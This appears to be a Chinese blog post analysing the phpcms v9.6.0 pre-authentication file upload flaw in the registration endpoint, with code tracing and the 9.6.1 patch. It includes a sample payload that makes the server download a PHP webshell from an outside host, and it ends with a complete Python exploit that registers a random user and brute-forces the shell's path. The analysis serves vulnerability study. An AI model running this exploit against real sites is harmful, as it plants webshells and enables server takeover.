phpcms 四月份左右和sql注入漏洞一同，爆出了一个任意文件上传漏洞，漏洞利用比较简单，危害很大，可以直接前台getshell.  这里来一块分析一下。

漏洞利用点是注册的地方，我们来看一下常见的一个payload:

    index.php?m=member&c=index&a=register&siteid=1

    post数据： 
    siteid=1&modelid=11&username=test&password=testxx&email=test@qq.com&info[content]=<img src=http://www.blogsir.com.cn/lj_ctf/shell.txt?.php#.jpg>&dosubmit=1
    
我们来动态调试去跟踪代码, phpcms 注册在模块`/phpcms/modules/member` 的index.php文件中，找到register函数，130行左右的代码

```php
//附表信息验证 通过模型获取会员信息
if($member_setting['choosemodel']) {
	require_once CACHE_MODEL_PATH.'member_input.class.php';
    require_once CACHE_MODEL_PATH.'member_update.class.php';
	$member_input = new member_input($userinfo['modelid']);
	$_POST['info'] = array_map('new_html_special_chars',$_POST['info']);
	$user_model_info = $member_input->get($_POST['info']);				     
```


首先包含了caches/caches_model/下面的两个文件，并通过modelid new了一个member_input类， 我们来看一下这两个文件, 这两个文件都调用一个model

    pc_base::load_model('sitemodel_field_model');
    
phpcms 的models文件在`/phpcms/model`目录下

```php
<?php
defined('IN_PHPCMS') or exit('No permission resources.');
pc_base::load_sys_class('model', '', 0);
class sitemodel_field_model extends model {
	public $table_name = '';
	public function __construct() {
		$this->db_config = pc_base::load_config('database');
		$this->db_setting = 'default';
		$this->table_name = 'model_field';
		parent::__construct();
	}
	/**
	 * 删除字段
	 * 
	 */
	public function drop_field($tablename,$field) {
		$this->table_name = $this->db_tablepre.$tablename;
		$fields = $this->get_fields();
		if(in_array($field, array_keys($fields))) {
			return $this->db->query("ALTER TABLE `$this->table_name` DROP `$field`;");
		} else {
			return false;
		}
	}
	
	/**
	 * 改变数据表
	 */
	public function change_table($tablename = '') {
		if (!$tablename) return false;
		
		$this->table_name = $this->db_tablepre.$tablename;
		return true;
	}
}
?>
```

整个流程就是需要通过modelid去匹配modelid对应的内容，因此modelid的取值也是十分关键，我们来看一下数据库里面modelid的取值:

```sql
mysql> select modelid,count(modelid) from v9_model_field group by modelid;
+---------+----------------+
| modelid | count(modelid) |
+---------+----------------+
|       1 |             23 |
|       2 |             30 |
|       3 |             23 |
|      10 |              1 |
|      11 |             24 |
+---------+----------------+
5 rows in set (0.00 sec)
```

modelid 的取值只能是1,2,3,11(10不行，后面需要调用的editor函数就保存在这个表中，modelid为10不存在这个函数)

之后从post中获取info的值，并用new_html_special_chars函数对`<>` 编码之后，进入$member_input->get()函数， 该函数位于`caches/caches_model/caches_data/member_input.class.php`中，接下来函数走到如下位置:

```php
function get($data) {
	$this->data = $data = trim_script($data);
	$model_cache = getcache('member_model', 'commons');
	$this->db->table_name = $this->db_pre.$model_cache[$this->modelid]['tablename'];

	$info = array();
	$debar_filed = array('catid','title','style','thumb','status','islink','description');
	if(is_array($data)) {
		foreach($data as $field=>$value) {
			if($data['islink']==1 && !in_array($field,$debar_filed)) continue;
			$field = safe_replace($field);
			$name = $this->fields[$field]['name'];
			$minlength = $this->fields[$field]['minlength'];
			$maxlength = $this->fields[$field]['maxlength'];
			$pattern = $this->fields[$field]['pattern'];
			$errortips = $this->fields[$field]['errortips'];
			if(empty($errortips)) $errortips = "$name 不符合要求！";
			$length = empty($value) ? 0 : strlen($value);
			if($minlength && $length < $minlength && !$isimport) showmessage("$name 不得少于 $minlength 个字符！");
			if (!array_key_exists($field, $this->fields)) showmessage('模型中不存在'.$field.'字段');
			if($maxlength && $length > $maxlength && !$isimport) {
				showmessage("$name 不得超过 $maxlength 个字符！");
			} else {
				str_cut($value, $maxlength);
			}
			if($pattern && $length && !preg_match($pattern, $value) && !$isimport) showmessage($errortips);
            if($this->fields[$field]['isunique'] && $this->db->get_one(array($field=>$value),$field) && ROUTE_A != 'edit') showmessage("$name 的值不得重复！");
			$func = $this->fields[$field]['formtype'];
			if(method_exists($this, $func)) $value = $this->$func($field, $value);

			$info[$field] = $value;
		}
	}
	return $info;
}
```

这个函数大概就是从模型中获取数据，遍历$_POST['info'] 的值，然后调用对应的函数，因为我们的payload是info[content], 所有调用的editor函数，在数据库中的模型数据如下:

```sql
mysql> select modelid,siteid,field,name,formtype from v9_model_field where modelid=1;
+---------+--------+---------------+-----------------+------------+
| modelid | siteid | field         | name            | formtype   |
+---------+--------+---------------+-----------------+------------+
|       1 |      1 | catid         | 栏目            | catid      |
|       1 |      1 | typeid        | 类别            | typeid     |
|       1 |      1 | title         | 标题            | title      |
|       1 |      1 | thumb         | 缩略图          | image      |
|       1 |      1 | keywords      | 关键词          | keyword    |
|       1 |      1 | description   | 摘要            | textarea   |
|       1 |      1 | updatetime    | 更新时间        | datetime   |
|       1 |      1 | content       | 内容            | editor     |
|       1 |      1 | voteid        | 添加投票        | omnipotent |
|       1 |      1 | pages         | 分页方式        | pages      |
|       1 |      1 | inputtime     | 发布时间        | datetime   |
|       1 |      1 | posids        | 推荐位          | posid      |
|       1 |      1 | url           | URL             | text       |
|       1 |      1 | listorder     | 排序            | number     |
|       1 |      1 | status        | 状态            | box        |
|       1 |      1 | template      | 内容页模板      | template   |
|       1 |      1 | groupids_view | 阅读权限        | groupid    |
|       1 |      1 | readpoint     | 阅读收费        | readpoint  |
|       1 |      1 | relation      | 相关文章        | omnipotent |
|       1 |      1 | allow_comment | 允许评论        | box        |
|       1 |      1 | copyfrom      | 来源            | copyfrom   |
|       1 |      1 | username      | 用户名          | text       |
|       1 |      1 | islink        | 转向链接        | islink     |
+---------+--------+---------------+-----------------+------------+
23 rows in set (0.02 sec)
```

editor 函数就在该函数下面：

```php
function editor($field, $value) {
	$setting = string2array($this->fields[$field]['setting']);
	$enablesaveimage = $setting['enablesaveimage'];
	$site_setting = string2array($this->site_config['setting']);
	$watermark_enable = intval($site_setting['watermark_enable']);
	$value = $this->attachment->download('content', $value,$watermark_enable);
	return $value;
}
```

在editor函数中调用了download去处理$value,attachement类在构造函数中有定义:

```
function __construct($modelid) {
	$this->db = pc_base::load_model('sitemodel_field_model');
	$this->db_pre = $this->db->db_tablepre;
	$this->modelid = $modelid;
	$this->fields = getcache('model_field_'.$modelid,'model');

	//初始化附件类
	pc_base::load_sys_class('attachment','',0);
	$this->siteid = param::get_cookie('siteid');
	$this->attachment = new attachment('content','0',$this->siteid);

}
```

load_sys_class()函数的目录在`/phpcms/libs/classes/`目录下

继续跟进,在phpcms/libs/classes/attachment.class.php中:

```
function download($field, $value,$watermark = '0',$ext = 'gif|jpg|jpeg|bmp|png', $absurl = '', $basehref = '')
{
	global $image_d;
	$this->att_db = pc_base::load_model('attachment_model');
	$upload_url = pc_base::load_config('system','upload_url');
	$this->field = $field;
	$dir = date('Y/md/');
	$uploadpath = $upload_url.$dir;
	$uploaddir = $this->upload_root.$dir;
	$string = new_stripslashes($value);
	if(!preg_match_all("/(href|src)=([\"|']?)([^ \"'>]+\.($ext))\\2/i", $string, $matches)) return $value;
	$remotefileurls = array();
	foreach($matches[3] as $matche)
	{
		if(strpos($matche, '://') === false) continue;
		dir_create($uploaddir);
		$remotefileurls[$matche] = $this->fillurl($matche, $absurl, $basehref);
	}
	unset($matches, $string);
	$remotefileurls = array_unique($remotefileurls);
	$oldpath = $newpath = array();
	foreach($remotefileurls as $k=>$file) {
		if(strpos($file, '://') === false || strpos($file, $upload_url) !== false) continue;
		$filename = fileext($file);
		$file_name = basename($file);
		$filename = $this->getname($filename); //随机化文件名

		$newfile = $uploaddir.$filename;
		$upload_func = $this->upload_func;
		if($upload_func($file, $newfile)) {
			$oldpath[] = $k;
			$GLOBALS['downloadfiles'][] = $newpath[] = $uploadpath.$filename;
			@chmod($newfile, 0777);
			$fileext = fileext($filename);
			if($watermark){
				watermark($newfile, $newfile,$this->siteid);
			}
			$filepath = $dir.$filename;
			$downloadedfile = array('filename'=>$filename, 'filepath'=>$filepath, 'filesize'=>filesize($newfile), 'fileext'=>$fileext);
			$aid = $this->add($downloadedfile);
			$this->downloadedfiles[$aid] = $filepath;
		}
	}
	return str_replace($oldpath, $newpath, $value);
}	
```

函数中先对$value中的引号进行了转义，然后使用正则匹配：
```php
$ext = 'gif|jpg|jpeg|bmp|png';
...
$string = new_stripslashes($value);
if(!preg_match_all("/(href|src)=([\"|']?)([^ \"'>]+\.($ext)
```

这里正则要求输入满足src/href=url.(gif|jpg|jpeg|bmp|png)，我们的 payload （`<img src=http://url/shell.txt?.php#.jpg>`）符合这一格式（这也就是为什么后面要加.jpg的原因）。

接下来程序使用这行代码来去除 url 中的锚点：$remotefileurls[$matche] = $this->fillurl($matche, $absurl, $basehref);，处理过后$remotefileurls的内容为: 
`http://xxx/shell.txt?.php`

可以看到#.jpg被删除了，正因如此，下面的`$filename = fileext($file);`取的的后缀变成了php(这也就是 PoC 中为什么要加#的原因：把前面为了满足正则而构造的.jpg过滤掉，使程序获得我们真正想要的php文件后缀)

```php
function fileext($filename) {
	return strtolower(trim(substr(strrchr($filename, '.'), 1, 10)));
}
```

strrchr — 查找指定字符在字符串中的最后一次出现

继续执行，程序调用copy函数， copy函数可以传入一个url作为远程文件名，到这里我们已经在`/uploadfile/Y/md/`目录下写入了一个php马。

那么如果shell的路径呢？ ，这里有两种方法:

1. 程序继续运行后返回到register函数

```php
if(pc_base::load_config('system', 'phpsso')) {
	$this->_init_phpsso();
	$status = $this->client->ps_member_register($userinfo['username'], $userinfo['password'], $userinfo['email'], $userinfo['regip'], $userinfo['encrypt']);
	if($status > 0) {
		$userinfo['phpssouid'] = $status;
		//传入phpsso为明文密码，加密后存入phpcms_v9
		$password = $userinfo['password'];
		$userinfo['password'] = password($userinfo['password'], $userinfo['encrypt']);
		$userid = $this->db->insert($userinfo, 1);
		if($member_setting['choosemodel']) {	//如果开启选择模型
			$user_model_info['userid'] = $userid;
			//插入会员模型数据
			$this->db->set_model($userinfo['modelid']);
			$this->db->insert($user_model_info);
		}
```

可以看到当$status > 0时会执行 SQL 语句进行 INSERT 操作，也就是向v9_member_detail的content和userid两列插入数据，我们看一下该表的结构：因为表中并没有content列，所以产生报错，从而将插入数据中的 shell 路径返回给了我们：


那么什么时候$status>0呢？

几个小于0的状态码都是因为用户名和邮箱，所以在 payload 中用户名和邮箱要尽量随机。

另外在 phpsso 没有配置好的时候$status的值为空，也同样不能得到路径。 这个时候程序会报错为:`operation_failure`
![image.png](http://upload-images.jianshu.io/upload_images/2159605-2dab46eefe45f7c8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)


2.  在无法得到路径的情况下我们只能爆破了， 文件名生成的方法为:

```
function getname($fileext){
	return date('Ymdhis').rand(100, 999).'.'.$fileext;
}
```

因为我们只需要爆破rand(100,999)即可，很容易爆破出来文件名


## 补丁
在phpcms9.6.1中修复了该漏洞，修复方案就是对用fileext获取到的文件后缀再用黑白名单分别过滤一次。
![image.png](http://upload-images.jianshu.io/upload_images/2159605-f61e0d45b0b6e9a4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)




exp:

```
import re
import requests
import random
import time

def randomstring(length):
    s = ''
    dic = "abcdefghijklmnopqrstuvwxyz"
    for i in range(int(length)):
        s += dic[random.randint(0,25)]
    return s

def poc(url):
    u = '{}/index.php?m=member&c=index&a=register&siteid=1'.format(url)
    data = {
        'siteid': '1',
        'modelid': '11',
        "username": "%s"%randomstring(12),
        "password": "%s"%randomstring(12),
        "email": "%s@qq.com"%randomstring(12),
        'info[content]': '<img src=http://xxx/shell.txt?.php#.jpg>',
        'dosubmit': '1',
    }
    headers = {
        'cookie:':'PHPSESSID=t3id73sqv3dbnkhbbd0ojeh5r0; XDEBUG_SESSION=PHPSTORM'
    }
    rep = requests.post(u, data=data)
    #print rep.content

    shell = ''
    re_result = re.findall(r'&lt;img src=(.*)&gt', rep.content)
    if len(re_result):
        shell = re_result[0]
        if shell:
            print 'shell:',shell

    tmp = time.strftime('%Y%m%d%I%M%S',time.localtime(time.time()))
    path = time.strftime('%Y',time.localtime(time.time()))+'/'+time.strftime('%m%d',time.localtime(time.time()))+'/'
    for i in range(100,999):
        filename = tmp+str(i)+'.php'
        shell = url+'uploadfile/'+path+filename
        req = requests.get(url=shell)
        if req.status_code == 200:
            print 'brute shell:',shell
            break


if __name__ == '__main__':
    poc('http://localhost/')

```